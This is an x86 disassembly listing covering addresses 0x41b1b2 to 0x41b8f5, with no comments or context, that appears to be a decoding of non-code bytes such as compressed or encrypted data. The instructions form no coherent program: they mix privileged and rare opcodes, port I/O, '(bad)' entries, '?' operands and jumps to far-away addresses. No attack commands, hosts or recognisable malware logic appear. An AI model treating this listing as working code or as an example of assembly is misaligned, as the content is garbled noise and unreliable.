  41b1b2:	xor    dh,BYTE PTR [edx+edi*4+0x1b28e7b0]
  41b1b9:	pop    ecx
  41b1ba:	test   BYTE PTR [esi-0x663c30ec],dl
  41b1c0:	stc    
  41b1c1:	cmc    
  41b1c2:	adc    al,0x35
  41b1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1c5:	mov    ch,0x76
  41b1c7:	mov    dl,0x4f
  41b1c9:	mov    ecx,0x5d2c052a
  41b1ce:	cdq    
  41b1cf:	sbb    ecx,DWORD PTR [ebx]
  41b1d1:	pusha  
  41b1d2:	jne    0x41b1fe
  41b1d4:	mov    edx,0x87e6c4bc
  41b1d9:	iret   
  41b1da:	addr16 loop 0x41b1a4
  41b1dd:	lods   al,BYTE PTR ds:[esi]
  41b1de:	lds    edi,FWORD PTR [ebp-0x78e56d45]
  41b1e4:	cmp    bl,BYTE PTR ds:0xb20027bf
  41b1ea:	add    BYTE PTR [ebx+0x5b],0x25
  41b1ee:	xchg   edx,eax
  41b1ef:	lock cld 
  41b1f1:	jecxz  0x41b272
  41b1f3:	or     BYTE PTR [edi-0x16],bl
  41b1f6:	data16 test al,0x5f
  41b1f9:	cmp    edi,esi
  41b1fb:	push   es
  41b1fc:	and    BYTE PTR [ecx],ch
  41b1fe:	mov    dl,BYTE PTR [ecx]
  41b200:	xlat   BYTE PTR ds:[ebx]
  41b201:	or     BYTE PTR [esi+0x24],0x39
  41b205:	pop    ebp
  41b206:	out    0x1c,eax
  41b208:	inc    edi
  41b209:	pushf  
  41b20a:	frstor [ebp-0x51]
  41b20d:	nop
  41b20e:	jb     0x31f4b3ee
  41b214:	adc    DWORD PTR [ebx],eax
  41b216:	dec    DWORD PTR [edi-0x75]
  41b219:	dec    ebp
  41b21a:	mov    dh,0xe7
  41b21c:	frstor [ebp-0xcd8f9d1]
  41b222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b223:	jbe    0x41b21a
  41b225:	dec    ecx
  41b226:	fcom   QWORD PTR [edi]
  41b228:	mov    esi,0xef168f19
  41b22d:	add    dl,0x2d
  41b230:	rcl    DWORD PTR [ebx-0x2f620aa2],cl
  41b236:	dec    ecx
  41b237:	leave  
  41b238:	ins    DWORD PTR es:[edi],dx
  41b239:	outs   dx,BYTE PTR ds:[esi]
  41b23a:	lds    esp,FWORD PTR [ebp-0x40]
  41b23d:	or     eax,0xe2fc60d6
  41b242:	jg     0x41b26a
  41b244:	dec    eax
  41b245:	js     0x41b228
  41b247:	push   eax
  41b248:	mov    bh,0xe4
  41b24a:	bound  esi,QWORD PTR [edx+0x2aafc814]
  41b250:	or     BYTE PTR [ebp-0x44],dh
  41b253:	shl    BYTE PTR [eax],1
  41b255:	sbb    dl,BYTE PTR [edi]
  41b257:	into   
  41b258:	inc    eax
  41b259:	ins    BYTE PTR es:[edi],dx
  41b25a:	cwde   
  41b25b:	shr    DWORD PTR [ebx+0x698d86b5],0x3e
  41b262:	iret   
  41b263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b264:	mov    dh,0x68
  41b266:	dec    esi
  41b267:	into   
  41b268:	loope  0x41b2d6
  41b26a:	lods   al,BYTE PTR fs:[esi]
  41b26c:	push   edi
  41b26d:	rcl    DWORD PTR [edi],1
  41b26f:	push   ebx
  41b270:	mov    WORD PTR [ecx-0x58df4062],gs
  41b276:	xlat   BYTE PTR ds:[ebx]
  41b277:	pop    ebp
  41b278:	xor    DWORD PTR [ebp+0x40dfe0bf],esp
  41b27e:	cmc    
  41b27f:	in     eax,0xaf
  41b281:	push   es
  41b282:	ret    0x8607
  41b285:	pop    edx
  41b286:	pop    eax
  41b287:	mov    ch,0xdb
  41b289:	adc    dh,BYTE PTR [esi+ebx*4+0x25fe4486]
  41b290:	ins    DWORD PTR es:[edi],dx
  41b291:	and    dh,BYTE PTR [esi+0x1c002d2e]
  41b297:	push   ebp
  41b298:	sbb    DWORD PTR ds:0x8e2222bd,0x89def5c7
  41b2a2:	neg    DWORD PTR [ebp-0x33]
  41b2a5:	adc    DWORD PTR [ecx],ebx
  41b2a7:	cmp    BYTE PTR [eax],bh
  41b2a9:	fcomp  QWORD PTR [edi-0xe]
  41b2ac:	std    
  41b2ad:	push   esp
  41b2ae:	clc    
  41b2af:	sub    BYTE PTR ds:0xaeb1da92,cl
  41b2b5:	cmp    eax,0xc9889d15
  41b2ba:	jge    0x41b245
  41b2bc:	jl     0x41b24a
  41b2be:	mov    BYTE PTR [edi-0xa],0xb6
  41b2c2:	mov    dl,0x61
  41b2c4:	fcom   QWORD PTR [ebp-0x13ec593d]
  41b2cb:	scas   al,BYTE PTR es:[edi]
  41b2cc:	stos   BYTE PTR es:[edi],al
  41b2cd:	inc    eax
  41b2ce:	rsm    
  41b2d0:	ja     0x41b306
  41b2d2:	scas   al,BYTE PTR es:[edi]
  41b2d3:	jg     0x41b2e9
  41b2d5:	stos   DWORD PTR es:[edi],eax
  41b2d6:	push   eax
  41b2d7:	aam    0x86
  41b2d9:	jbe    0x41b2cc
  41b2db:	inc    esp
  41b2dc:	and    eax,ebp
  41b2de:	shl    DWORD PTR [esi-0x7],cl
  41b2e1:	dec    ebp
  41b2e2:	mov    gs,WORD PTR cs:[ebx-0x21fdcffa]
  41b2e9:	xchg   ebx,eax
  41b2ea:	add    BYTE PTR [eax],0x27
  41b2ed:	stos   DWORD PTR es:[edi],eax
  41b2ee:	arpl   WORD PTR [ecx],ax
  41b2f0:	xor    ch,ah
  41b2f2:	test   al,0xc6
  41b2f4:	rcl    DWORD PTR [esi-0x47f512df],0x66
  41b2fb:	and    DWORD PTR [esi+0x32337681],0x36
  41b302:	nop
  41b303:	jmp    0x82d0bf6
  41b308:	jecxz  0x41b321
  41b30a:	leave  
  41b30b:	pop    ds
  41b30c:	inc    eax
  41b30d:	add    esi,ebp
  41b30f:	pop    ss
  41b310:	push   es
  41b311:	dec    eax
  41b312:	shl    BYTE PTR [ecx+0x12cae2e2],1
  41b318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b319:	out    0x6,eax
  41b31b:	or     DWORD PTR [ebx],edi
  41b31d:	or     bl,ch
  41b31f:	inc    edx
  41b320:	inc    edx
  41b322:	xor    eax,0xe8ac658c
  41b327:	cli    
  41b328:	or     eax,esp
  41b32a:	ror    al,cl
  41b32c:	idiv   BYTE PTR [ecx+0x5753914b]
  41b332:	push   ecx
  41b333:	into   
  41b334:	ret    0x3a3a
  41b337:	cmc    
  41b338:	aaa    
  41b339:	push   0xffffffaf
  41b33b:	sub    al,0x92
  41b33d:	dec    ebx
  41b33e:	and    eax,0x5ce98636
  41b343:	mov    dl,0x93
  41b345:	cmp    ebp,DWORD PTR [edx]
  41b347:	dec    ebp
  41b348:	stos   BYTE PTR es:[edi],al
  41b349:	mov    bh,0xa3
  41b34b:	sub    BYTE PTR [edi+eiz*4-0x625873c0],al
  41b352:	imul   ebp,DWORD PTR [ebp-0x12],0x47
  41b356:	out    dx,eax
  41b357:	adc    eax,0x6983bc3a
  41b35c:	lahf   
  41b35d:	out    0xd0,al
  41b35f:	jne    0x41b313
  41b361:	ss out dx,eax
  41b363:	pop    ss
  41b364:	sbb    ebp,ebp
  41b366:	lock pop es
  41b368:	mov    eax,0xc162d370
  41b36d:	sub    edx,ecx
  41b36f:	and    al,0xc8
  41b371:	adc    dh,bh
  41b373:	test   DWORD PTR [ebp-0x513827ce],esi
  41b379:	push   0xffffffb1
  41b37b:	jnp    0x41b360
  41b37d:	fwait
  41b37e:	lahf   
  41b37f:	das    
  41b380:	out    dx,al
  41b381:	mov    ds,esi
  41b383:	out    dx,eax
  41b384:	inc    eax
  41b385:	je     0x41b38f
  41b387:	or     al,0xb9
  41b389:	push   esi
  41b38a:	sbb    eax,edx
  41b38c:	out    0x71,al
  41b38e:	enter  0xe0db,0x7a
  41b392:	pushf  
  41b393:	xchg   esp,eax
  41b394:	jb     0x41b3ae
  41b396:	icebp  
  41b397:	les    ebx,FWORD PTR [edi]
  41b399:	mov    bh,0xb0
  41b39b:	stc    
  41b39c:	pop    ss
  41b39d:	jb     0x41b3d5
  41b39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a0:	mov    al,ds:0xfa4f4f72
  41b3a5:	push   ss
  41b3a6:	sbb    BYTE PTR [esi],al
  41b3a8:	inc    ebx
  41b3a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3aa:	dec    ebx
  41b3ab:	jge    0x41b39c
  41b3ad:	icebp  
  41b3ae:	xor    eax,0xa7f94f38
  41b3b3:	add    BYTE PTR ds:0x6f98ca63,0xe7
  41b3ba:	cmp    ebx,ecx
  41b3bc:	mov    ebx,DWORD PTR [edx+0x26]
  41b3bf:	sub    DWORD PTR [ecx],ebx
  41b3c1:	mov    esi,0x536c320d
  41b3c6:	mov    bl,0x3b
  41b3c8:	mov    al,0xf1
  41b3ca:	inc    ebx
  41b3cb:	fmul   QWORD PTR [eax]
  41b3cd:	xchg   esp,eax
  41b3ce:	je     0x41b399
  41b3d0:	inc    esi
  41b3d1:	outs   dx,BYTE PTR ds:[esi]
  41b3d2:	inc    edi
  41b3d3:	xor    al,0x82
  41b3d5:	adc    DWORD PTR [ecx],0x69ebacff
  41b3db:	xor    DWORD PTR es:[edi],ebx
  41b3de:	lds    ebp,FWORD PTR [ecx-0x2b]
  41b3e1:	and    al,0x90
  41b3e3:	pop    ecx
  41b3e4:	call   0xeeb994f4
  41b3e9:	fnstcw WORD PTR [esi-0x44544e1d]
  41b3ef:	iret   
  41b3f0:	data16 js 0x41b3e3
  41b3f3:	sbb    al,0x8d
  41b3f5:	dec    ebx
  41b3f6:	mov    ds:0xb4324906,eax
  41b3fb:	sahf   
  41b3fc:	jmp    0x40e57c15
  41b401:	mov    WORD PTR [edi-0x56],ds
  41b404:	lea    ebp,[ebx+0x72]
  41b407:	sbb    DWORD PTR [ebx],eax
  41b409:	es loopne 0x41b44a
  41b40c:	ret    
  41b40d:	xchg   edi,eax
  41b40e:	test   al,0xf7
  41b410:	jp     0x41b436
  41b412:	aad    0x79
  41b414:	enter  0x193f,0xd8
  41b418:	adc    eax,0xdcf0c17c
  41b41d:	sub    DWORD PTR [esi],esi
  41b41f:	stos   BYTE PTR es:[edi],al
  41b420:	push   ds
  41b421:	bound  edi,QWORD PTR [edi]
  41b423:	jnp    0x41b451
  41b425:	gs push edx
  41b427:	pop    es
  41b428:	jecxz  0x41b445
  41b42a:	add    eax,0xdc4d969c
  41b42f:	pushf  
  41b430:	js     0x41b3d7
  41b432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b433:	pusha  
  41b434:	cdq    
  41b435:	pop    ds
  41b436:	mov    al,0x34
  41b438:	cdq    
  41b439:	xchg   edx,eax
  41b43a:	nop
  41b43b:	rcl    BYTE PTR [ebx+esi*2+0x50],1
  41b43f:	xor    DWORD PTR [ebp+0xe0dd0e],ecx
  41b445:	repnz out dx,eax
  41b447:	push   esp
  41b448:	sub    DWORD PTR [ebp-0x5a],ebp
  41b44b:	push   ecx
  41b44c:	pop    edx
  41b44d:	data16 test BYTE PTR [ebx+0xb40b3c2],bl
  41b454:	repnz imul ecx,DWORD PTR ds:0xf80093d5,0x5f07c195
  41b45f:	and    eax,0x30986604
  41b464:	scas   eax,DWORD PTR es:[edi]
  41b465:	mov    ecx,?
  41b467:	sub    BYTE PTR [edx],bh
  41b469:	mov    BYTE PTR [eax],0xa3
  41b46c:	addr16 lock call 0xc929:0x8de9ef2d
  41b475:	(bad)  
  41b477:	sbb    eax,DWORD PTR [ebx+edx*8+0x4]
  41b47b:	push   esi
  41b47c:	adc    DWORD PTR [edx+0x4b],ebx
  41b47f:	add    DWORD PTR [edi+ecx*1-0x41],edi
  41b483:	add    BYTE PTR ss:[edi],ch
  41b486:	mov    bl,0x0
  41b488:	fmul   QWORD PTR [ebx-0x7a9f0d83]
  41b48e:	test   DWORD PTR [edx-0x35],edx
  41b491:	xor    DWORD PTR [ebx-0x7d],edi
  41b494:	cmp    edx,DWORD PTR [esi+eax*8+0x1f8ee]
  41b49b:	dec    eax
  41b49c:	loop   0x41b4a3
  41b49e:	enter  0x3283,0x98
  41b4a2:	in     eax,dx
  41b4a3:	bound  edx,QWORD PTR es:[esi+0x33]
  41b4a7:	ss mov ch,0xf4
  41b4aa:	cli    
  41b4ab:	jno    0x41b513
  41b4ad:	pop    ebx
  41b4ae:	or     bl,BYTE PTR [ebp+0x74862cf0]
  41b4b4:	dec    ebp
  41b4b5:	hlt    
  41b4b6:	imul   ebp,DWORD PTR [ebx-0x97d0880],0x6e
  41b4bd:	hlt    
  41b4be:	push   ecx
  41b4bf:	test   al,0xbd
  41b4c1:	add    BYTE PTR [ecx+0x45],bl
  41b4c4:	sahf   
  41b4c5:	mov    esp,0xab5553c
  41b4ca:	pop    ss
  41b4cb:	mov    eax,cs
  41b4cd:	pop    ebp
  41b4ce:	push   edi
  41b4cf:	mov    al,0xfc
  41b4d1:	retf   0xddba
  41b4d4:	cmp    DWORD PTR [edi-0x7e93c053],0xf8371a33
  41b4de:	test   eax,0x9f92d2cb
  41b4e3:	cmp    DWORD PTR [ebp-0x21295050],ebx
  41b4e9:	ror    BYTE PTR [ecx-0x780f402b],0x43
  41b4f0:	inc    eax
  41b4f1:	inc    ebx
  41b4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4f3:	dec    ebx
  41b4f4:	test   BYTE PTR [ebx+0x154f950e],0xcb
  41b4fb:	or     al,0x18
  41b4fd:	ror    BYTE PTR [edi-0x66b94fd1],cl
  41b503:	or     al,0x2f
  41b505:	or     al,dh
  41b507:	cmp    ah,BYTE PTR [eax-0x6d]
  41b50a:	add    esi,ecx
  41b50c:	pusha  
  41b50d:	xor    BYTE PTR [edi-0x144e2c6d],cl
  41b513:	loope  0x41b508
  41b515:	dec    esi
  41b516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b517:	inc    ebx
  41b518:	pop    edi
  41b519:	imul   ebx,DWORD PTR [ecx-0x56c65787],0xffffffa6
  41b520:	add    cl,BYTE PTR gs:[ebx+0x28]
  41b524:	ss inc ebx
  41b526:	and    eax,0xe25c5300
  41b52b:	repz (bad) 
  41b52d:	push   edx
  41b52e:	lea    ebx,[edi-0x7c]
  41b531:	mov    al,0x13
  41b533:	mov    al,ds:0x3ef8e32
  41b538:	sti    
  41b539:	mov    edx,0xce0522ed
  41b53e:	xor    dl,dh
  41b540:	mov    edi,0x856e4779
  41b545:	imul   DWORD PTR [edi-0x21]
  41b548:	mov    eax,ds:0x44eaf9f3
  41b54d:	add    esi,esp
  41b54f:	or     eax,0xd6689835
  41b554:	mov    dh,0xf6
  41b556:	pusha  
  41b557:	loope  0x41b4e2
  41b559:	enter  0x6c68,0xb7
  41b55d:	mov    eax,0x99c630c4
  41b562:	mov    ecx,0x43adff85
  41b567:	jno    0x41b57e
  41b569:	sub    bl,al
  41b56b:	fild   WORD PTR [ecx]
  41b56d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b56e:	dec    ebx
  41b56f:	bound  eax,QWORD PTR [eax-0x2f]
  41b572:	into   
  41b573:	push   ebx
  41b574:	js     0x41b4f6
  41b576:	mov    eax,ds:0xe1c11ab7
  41b57b:	ja     0x41b50f
  41b57d:	jns    0x41b51b
  41b57f:	lods   eax,DWORD PTR ds:[esi]
  41b580:	pop    esi
  41b581:	sub    BYTE PTR [ebp+0x5ec47587],dh
  41b587:	mov    dl,0xee
  41b589:	xor    dl,bh
  41b58b:	imul   ecx,DWORD PTR ds:0xcd35ed52,0x85c65e0c
  41b595:	push   es
  41b596:	iret   
  41b597:	cdq    
  41b598:	push   ds
  41b599:	je     0x41b563
  41b59b:	iret   
  41b59c:	mov    ah,0x31
  41b59e:	pop    esp
  41b59f:	sbb    edi,esi
  41b5a1:	mov    dh,0xef
  41b5a3:	or     BYTE PTR [bp+si+0x6c],ch
  41b5a7:	mov    dl,0x5e
  41b5a9:	push   esp
  41b5aa:	(bad)  
  41b5ab:	sbb    DWORD PTR [eax],eax
  41b5ad:	stos   BYTE PTR es:[edi],al
  41b5ae:	sti    
  41b5af:	popa   
  41b5b0:	or     ecx,0xffffffbe
  41b5b3:	test   ebx,edi
  41b5b5:	rcl    DWORD PTR [ebx+eax*8],1
  41b5b8:	jp     0x41b5d3
  41b5ba:	in     eax,dx
  41b5bb:	outs   dx,DWORD PTR ds:[esi]
  41b5bc:	ins    DWORD PTR es:[edi],dx
  41b5bd:	aam    0x6a
  41b5bf:	adc    DWORD PTR [eax+0x77dd124b],ebp
  41b5c5:	sub    edx,DWORD PTR [esi-0x360a4fa]
  41b5cb:	mov    al,0xc2
  41b5cd:	xchg   ebx,eax
  41b5ce:	pop    esp
  41b5cf:	mov    ch,0x70
  41b5d1:	sbb    DWORD PTR [edx-0x12],edx
  41b5d4:	test   DWORD PTR [edx+0x7b],ecx
  41b5d7:	push   ss
  41b5d8:	psubq  mm4,QWORD PTR [edx+0x2f]
  41b5dc:	sub    esi,DWORD PTR [esi]
  41b5de:	mov    dh,0x2e
  41b5e0:	nop
  41b5e1:	not    DWORD PTR [ebx]
  41b5e3:	(bad)  
  41b5e4:	nop
  41b5e5:	push   cs
  41b5e6:	push   eax
  41b5e7:	add    bh,cl
  41b5e9:	into   
  41b5ea:	mov    al,bl
  41b5ec:	sub    ah,BYTE PTR [esp+eiz*8+0x6d]
  41b5f0:	repnz push esi
  41b5f2:	inc    esp
  41b5f3:	mov    cs,WORD PTR [edi]
  41b5f5:	jnp    0x41b5a5
  41b5f7:	popf   
  41b5f8:	mov    dl,0x4d
  41b5fa:	lock pop esi
  41b5fc:	or     al,0x66
  41b5fe:	inc    ecx
  41b5ff:	inc    eax
  41b600:	add    BYTE PTR [edx+0x38],dh
  41b603:	add    BYTE PTR [ebp+0x3c],cl
  41b606:	ss mov ah,0xf7
  41b609:	xor    BYTE PTR [eax+ecx*2-0x7855daa0],dh
  41b610:	ins    BYTE PTR es:[edi],dx
  41b611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b612:	mov    ebp,0xda5ca472
  41b617:	lock ret 0x868b
  41b61b:	rcr    BYTE PTR [esi+0x12],cl
  41b61e:	xchg   ebx,eax
  41b61f:	mov    ds:0x2ca6bcce,eax
  41b624:	jmp    0x4773c108
  41b629:	rcl    DWORD PTR [edx+0x0],0x65
  41b62d:	retf   0xee3d
  41b630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b631:	sbb    ecx,DWORD PTR [edi]
  41b633:	xchg   ebx,eax
  41b634:	int    0x32
  41b636:	cmp    al,0xd0
  41b638:	inc    esi
  41b63a:	cmc    
  41b63b:	sbb    DWORD PTR [esi],edx
  41b63d:	test   ecx,0x18516b08
  41b643:	and    eax,DWORD PTR [eax+0x315763ee]
  41b649:	cmp    DWORD PTR [esi],esi
  41b64b:	bound  eax,QWORD PTR [edx]
  41b64d:	repz sbb eax,0xbc615b95
  41b653:	adc    eax,0x42a747ae
  41b658:	push   cs
  41b659:	std    
  41b65a:	or     ch,BYTE PTR [edx-0x30a9b9ac]
  41b660:	add    edx,DWORD PTR [edx]
  41b662:	push   ds
  41b663:	mov    dh,0xb6
  41b665:	cmp    eax,DWORD PTR [esp+ebx*1+0x45]
  41b669:	inc    esp
  41b66a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66b:	enter  0xaffa,0x6d
  41b66f:	rol    BYTE PTR [edi],0x71
  41b672:	sub    cl,BYTE PTR [edi+0x515367bd]
  41b678:	cmp    edi,DWORD PTR ds:0xd668b9b1
  41b67e:	pop    es
  41b67f:	mov    BYTE PTR [esi-0x1e],dh
  41b682:	xor    bh,al
  41b684:	push   edx
  41b685:	shl    BYTE PTR [eax+0xf87b0a7],1
  41b68b:	inc    esp
  41b68c:	push   ebp
  41b68d:	fimul  WORD PTR [eax-0x443e5178]
  41b693:	push   0x3f
  41b695:	cdq    
  41b696:	xchg   esi,eax
  41b697:	out    0x1,eax
  41b699:	mov    ds:0x987aadb2,al
  41b69e:	in     eax,dx
  41b69f:	push   ebx
  41b6a0:	pop    esi
  41b6a1:	mov    dh,0x91
  41b6a3:	(bad)  
  41b6a4:	popf   
  41b6a5:	sahf   
  41b6a6:	idiv   BYTE PTR [eax]
  41b6a8:	mov    eax,ds:0x548744d1
  41b6ad:	pop    edi
  41b6ae:	fmul   QWORD PTR [esi+eax*8]
  41b6b1:	je     0x41b677
  41b6b3:	jno    0x41b709
  41b6b5:	in     eax,dx
  41b6b6:	repnz nop
  41b6b8:	mov    ah,0x5
  41b6ba:	sbb    DWORD PTR [eax+0xae91e4b],edi
  41b6c0:	add    DWORD PTR [esi+0x32],ebx
  41b6c3:	sbb    DWORD PTR [ecx-0x43945857],edx
  41b6c9:	ret    0x2a89
  41b6cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6cd:	add    DWORD PTR [edx-0x4395a35],ecx
  41b6d3:	fstp   DWORD PTR [edx]
  41b6d5:	mov    bl,0xf9
  41b6d7:	(bad)  
  41b6d8:	icebp  
  41b6d9:	sbb    eax,0x7a870933
  41b6de:	loopne 0x41b715
  41b6e0:	jb     0x41b6af
  41b6e2:	mov    eax,ds:0xfabc5199
  41b6e7:	or     ecx,DWORD PTR [edx-0x35]
  41b6ea:	cmp    edi,DWORD PTR [ecx+ebp*4]
  41b6ed:	fnstsw WORD PTR [ebx]
  41b6ef:	and    ebp,DWORD PTR [ecx-0x5c8e4183]
  41b6f5:	clc    
  41b6f6:	nop
  41b6f7:	test   eax,0x5f4dec6c
  41b6fc:	rol    DWORD PTR [edi],cl
  41b6fe:	push   bx
  41b700:	push   edx
  41b701:	out    0x6a,eax
  41b703:	cmc    
  41b704:	in     eax,0xab
  41b706:	fdivr  st(7),st
  41b708:	adc    DWORD PTR [ecx],0x48c68e01
  41b70e:	push   ds
  41b70f:	mov    bl,bh
  41b711:	mov    ah,0x9
  41b713:	popf   
  41b714:	cmp    eax,0x2b8e6b2f
  41b719:	push   esi
  41b71a:	xlat   BYTE PTR ds:[ebx]
  41b71b:	jle    0x41b6b9
  41b71d:	mov    esp,0x8ff8e02f
  41b722:	add    bl,bh
  41b724:	jl     0x41b6c6
  41b726:	out    0x6e,al
  41b728:	aam    0x4f
  41b72a:	in     eax,dx
  41b72b:	pop    ds
  41b72c:	into   
  41b72d:	inc    esp
  41b72e:	dec    eax
  41b72f:	pop    ebx
  41b730:	out    0xe0,eax
  41b732:	pop    ebp
  41b733:	adc    ebx,ebp
  41b735:	cmp    edi,DWORD PTR [edx-0x37]
  41b738:	lock xlat BYTE PTR ds:[ebx]
  41b73a:	mov    BYTE PTR [ecx-0x66],cl
  41b73d:	mov    ?,WORD PTR [edx+0xc9cdac1]
  41b743:	ds out dx,al
  41b745:	push   esp
  41b746:	inc    esp
  41b747:	cdq    
  41b748:	sbb    al,0xe9
  41b74a:	pop    esi
  41b74b:	pop    ebp
  41b74c:	mov    WORD PTR [edx],?
  41b74e:	outs   dx,BYTE PTR ds:[esi]
  41b74f:	add    dl,BYTE PTR [ecx+0x32]
  41b752:	fidiv  WORD PTR [ebx+0x1c]
  41b755:	inc    edi
  41b756:	sub    ah,al
  41b758:	dec    edx
  41b759:	fimul  DWORD PTR [eax+0x6272b859]
  41b75f:	and    dh,BYTE PTR [ecx+edi*8+0x4d]
  41b763:	mov    ah,0xdb
  41b765:	arpl   WORD PTR [ecx-0x7eef3577],cx
  41b76b:	xor    eax,ebx
  41b76d:	jb     0x41b766
  41b76f:	push   0xffffffb9
  41b771:	call   0x6405:0x5992c939
  41b778:	push   esp
  41b779:	mov    ds:0x87f7bbf1,al
  41b77e:	push   ecx
  41b77f:	jnp    0x41b73e
  41b781:	enter  0xcb61,0xf3
  41b785:	inc    esp
  41b786:	lods   eax,DWORD PTR ds:[esi]
  41b787:	pop    ds
  41b788:	cmp    eax,0xa2c97393
  41b78d:	dec    edi
  41b78e:	xchg   edx,eax
  41b78f:	inc    eax
  41b790:	(bad)  
  41b791:	(bad)  
  41b792:	and    DWORD PTR [ecx-0x2718029a],ebp
  41b798:	push   ebp
  41b799:	xor    al,0x14
  41b79b:	xor    DWORD PTR ds:0xa6d5cd73,esi
  41b7a1:	add    eax,0x8a0ae14d
  41b7a6:	dec    ebp
  41b7a7:	jae    0x41b7ad
  41b7a9:	xchg   ebx,eax
  41b7aa:	fstp   TBYTE PTR [esi]
  41b7ac:	hlt    
  41b7ad:	or     al,0x8c
  41b7af:	dec    ebp
  41b7b0:	data16 mov dl,0xd1
  41b7b3:	aam    0x7e
  41b7b5:	inc    ebx
  41b7b6:	mov    ah,0xd1
  41b7b8:	mov    esi,0x45ab6834
  41b7bd:	popa   
  41b7be:	mov    eax,ds:0xd16710bf
  41b7c3:	(bad)  
  41b7c4:	mov    bh,0xb2
  41b7c6:	loopne 0x41b816
  41b7c8:	(bad)  
  41b7c9:	xchg   ebx,eax
  41b7ca:	ins    BYTE PTR es:[edi],dx
  41b7cb:	jmp    0x5765c9ac
  41b7d0:	ds jae 0x41b788
  41b7d3:	pop    ebp
  41b7d4:	add    cl,BYTE PTR [ebx-0x11]
  41b7d7:	mov    cl,0x1f
  41b7d9:	sub    al,0x61
  41b7db:	add    DWORD PTR [edi+eax*1],ebp
  41b7de:	cwde   
  41b7df:	adc    ah,BYTE PTR [eax+0x5a44136f]
  41b7e5:	(bad)  
  41b7e6:	push   ds
  41b7e7:	jns    0x41b846
  41b7e9:	out    0x66,al
  41b7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ec:	rcr    DWORD PTR [ecx-0x60d93ba7],0x3d
  41b7f3:	and    al,0x96
  41b7f5:	add    al,0xa0
  41b7f7:	out    dx,eax
  41b7f8:	sub    eax,DWORD PTR [eax-0x1d28c661]
  41b7fe:	fdiv   st(6),st
  41b800:	sub    esi,DWORD PTR [esi]
  41b802:	inc    esp
  41b803:	xchg   DWORD PTR [ebx*4+0x5ff3bcaf],eax
  41b80a:	xchg   BYTE PTR [esi],cl
  41b80c:	push   ebx
  41b80d:	hlt    
  41b80e:	(bad)  [ecx-0x4c260a3c]
  41b814:	loopne 0x41b844
  41b816:	push   ebp
  41b817:	sti    
  41b818:	inc    ecx
  41b819:	push   edx
  41b81a:	add    eax,0x7408766a
  41b81f:	or     DWORD PTR [eax+0x1a],esi
  41b822:	es hlt 
  41b824:	icebp  
  41b825:	scas   eax,DWORD PTR es:[edi]
  41b826:	inc    edx
  41b827:	or     eax,0x53ce2e2a
  41b82c:	cs pop es
  41b82e:	inc    esp
  41b82f:	int3   
  41b830:	ret    0x7bc8
  41b833:	add    eax,0x9e54dded
  41b838:	dec    edi
  41b839:	(bad)
  41b83d:	jno    0x41b84c
  41b83f:	add    eax,0x432d2495
  41b844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b845:	or     bh,BYTE PTR [ebp+0x5a]
  41b848:	icebp  
  41b849:	ins    BYTE PTR es:[edi],dx
  41b84a:	sbb    al,0xe3
  41b84c:	xor    BYTE PTR [eax+0x1a1d6373],bh
  41b852:	in     eax,0x58
  41b854:	mov    esp,0x7e2ec221
  41b859:	jno    0x41b886
  41b85b:	(bad)  
  41b85c:	fcmovnb st,st(2)
  41b85e:	(bad)  
  41b85f:	mov    cl,0x4d
  41b861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b862:	and    edx,DWORD PTR [esi-0xc]
  41b865:	retf   0xd152
  41b868:	and    DWORD PTR [esi],ecx
  41b86a:	pop    ecx
  41b86b:	pop    ebx
  41b86c:	jo     0x41b83f
  41b86e:	test   dh,cl
  41b870:	imul   ebx,DWORD PTR [bx+di+0x45],0xffffffa6
  41b875:	cli    
  41b876:	and    al,0x4a
  41b878:	jmp    0x41b89b
  41b87a:	jbe    0x41b8b1
  41b87c:	mov    eax,0xc530201d
  41b881:	xchg   ecx,eax
  41b882:	push   esi
  41b883:	je     0x41b8fa
  41b885:	fadd   QWORD PTR [esi]
  41b887:	(bad)  
  41b888:	jns    0x41b81d
  41b88a:	pop    ecx
  41b88b:	addr16 mov edi,0x393d52c1
  41b891:	daa    
  41b892:	dec    esp
  41b893:	outs   dx,BYTE PTR ds:[esi]
  41b895:	pop    ss
  41b896:	mov    bl,dl
  41b898:	xchg   esi,eax
  41b899:	or     DWORD PTR [esi-0x13b28e94],edi
  41b89f:	nop
  41b8a0:	xchg   ebp,eax
  41b8a1:	dec    ecx
  41b8a2:	add    eax,0xc5b2fb4b
  41b8a7:	test   eax,0xd4d0c4d4
  41b8ac:	push   ss
  41b8ad:	mov    ecx,0x6d9d8cb9
  41b8b2:	loopne 0x41b89f
  41b8b4:	jne    0x41b8c2
  41b8b6:	sbb    eax,0xcffec7b7
  41b8bb:	dec    eax
  41b8bc:	dec    edi
  41b8bd:	mov    ss,WORD PTR [esi+0x4ba1dd9b]
  41b8c3:	mov    ecx,0xe1929132
  41b8c8:	adc    eax,0x397b33a6
  41b8cd:	add    DWORD PTR [ebx+ecx*1],0x7e
  41b8d1:	ja     0x41b871
  41b8d3:	icebp  
  41b8d4:	add    al,0x30
  41b8d6:	int3   
  41b8d7:	pop    ds
  41b8d8:	loop   0x41b8c7
  41b8da:	add    al,0x35
  41b8dc:	aam    0x2a
  41b8de:	adc    eax,0xef4e401
  41b8e3:	mov    ch,bh
  41b8e5:	mov    eax,0x3b293b4c
  41b8ea:	push   edi
  41b8eb:	and    al,0xda
  41b8ed:	push   cs
  41b8ee:	or     al,0x49
  41b8f0:	jno    0x41b881
  41b8f2:	test   cl,0x28
  41b8f5:	push   DWORD PTR [ebx+0x28]
